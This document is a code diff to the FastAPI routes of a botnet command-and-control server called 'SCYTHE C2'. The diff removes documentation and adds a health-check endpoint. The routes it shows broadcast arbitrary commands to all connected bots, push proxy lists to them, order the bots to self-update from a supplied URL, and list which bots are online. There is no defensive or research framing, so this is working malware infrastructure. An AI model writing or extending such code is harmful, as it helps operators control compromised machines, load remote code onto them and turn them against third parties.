@@ -1,11 +1,5 @@
 """
 Botnet management routes for SCYTHE C2.
-- GET  /api/botnet/stats          → Get botnet statistics
-- HEAD /api/botnet/status         → Health check for botnet service
-- POST /api/botnet/broadcast      → Send command to all bots
-- POST /api/botnet/update-proxies → Update proxies on all bots
-- POST /api/botnet/update-self    → Self-update all bots
-- GET  /api/botnet/online         → List online bots
 """
 
 from fastapi import APIRouter, Request, HTTPException, Response
@@ -20,37 +14,36 @@ router = APIRouter(prefix="/api/botnet", tags=["botnet"])
 
 
 class BroadcastCommand(BaseModel):
-    """Model for broadcasting a command to all bots."""
     cmd: str
     payload: Optional[Dict[str, Any]] = None
 
 
 class UpdateSelfRequest(BaseModel):
-    """Model for self-update command."""
     url: str
 
 
 @router.get("/stats", response_model=BotStats)
 async def get_botnet_stats(request: Request):
-    """
-    Get botnet statistics:
-    - active: number of bots currently connected
-    - total: total bots registered
-    - avg_rpm: average requests per minute from all bots
-    - total_requests: total requests sent by all bots (all time)
-    """
     botnet_manager = request.app.state.botnet_manager
     stats = await botnet_manager.get_bot_stats()
     logger.debug(f"Botnet stats: {stats}")
     return stats
 
 
+# FIX: Add HEAD /stats for dashboard health check
+@router.head("/stats")
+async def head_botnet_stats(request: Request):
+    try:
+        botnet_manager = request.app.state.botnet_manager
+        if botnet_manager._running:
+            return Response(status_code=200)
+        return Response(status_code=503)
+    except Exception:
+        return Response(status_code=503)
+
+
 @router.head("/status")
 async def botnet_status(request: Request):
-    """
-    Health check endpoint for botnet service.
-    Returns 200 if the botnet manager is operational.
-    """
     try:
         botnet_manager = request.app.state.botnet_manager
         if botnet_manager._running:
@@ -63,17 +56,12 @@ async def botnet_status(request: Request):
 
 @router.post("/broadcast")
 async def broadcast_command(request: Request, cmd_data: BroadcastCommand):
-    """
-    Broadcast a custom command to all connected bots.
-    Admin-only (protected by triple-click access in frontend).
-    """
     botnet_manager = request.app.state.botnet_manager
     try:
         command = {"cmd": cmd_data.cmd}
         if cmd_data.payload:
             command.update(cmd_data.payload)
 
-        # FIX: gunakan method yang lock-aware daripada direct dict access
         bot_ids = await botnet_manager.get_active_bot_ids()
         if not bot_ids:
             logger.warning(f"Broadcast command '{cmd_data.cmd}' skipped: no bots connected")
@@ -97,9 +85,6 @@ async def broadcast_command(request: Request, cmd_data: BroadcastCommand):
 
 @router.post("/update-proxies")
 async def update_bot_proxies(request: Request):
-    """
-    Send the latest proxy list to all connected bots.
-    """
     botnet_manager = request.app.state.botnet_manager
     proxy_manager = request.app.state.proxy_manager
     try:
@@ -110,7 +95,6 @@ async def update_bot_proxies(request: Request):
             "proxies": proxy_strings
         }
 
-        # FIX: gunakan lock-aware method
         bot_ids = await botnet_manager.get_active_bot_ids()
         if not bot_ids:
             logger.warning("Update proxies skipped: no bots connected")
@@ -134,9 +118,6 @@ async def update_bot_proxies(request: Request):
 
 @router.post("/update-self")
 async def update_bot_self(request: Request, update_req: UpdateSelfRequest):
-    """
-    Send self-update command to all bots.
-    """
     botnet_manager = request.app.state.botnet_manager
     try:
         command = {
@@ -144,7 +125,6 @@ async def update_bot_self(request: Request, update_req: UpdateSelfRequest):
             "url": update_req.url
         }
 
-        # FIX: gunakan lock-aware method
         bot_ids = await botnet_manager.get_active_bot_ids()
         if not bot_ids:
             logger.warning("Self-update skipped: no bots connected")
@@ -168,10 +148,6 @@ async def update_bot_self(request: Request, update_req: UpdateSelfRequest):
 
 @router.get("/online")
 async def get_online_bots(request: Request):
-    """
-    Get a list of currently online bot IDs.
-    Useful for debugging or admin monitoring.
-    """
     botnet_manager = request.app.state.botnet_manager
     bot_ids = await botnet_manager.get_active_bot_ids()
     return {
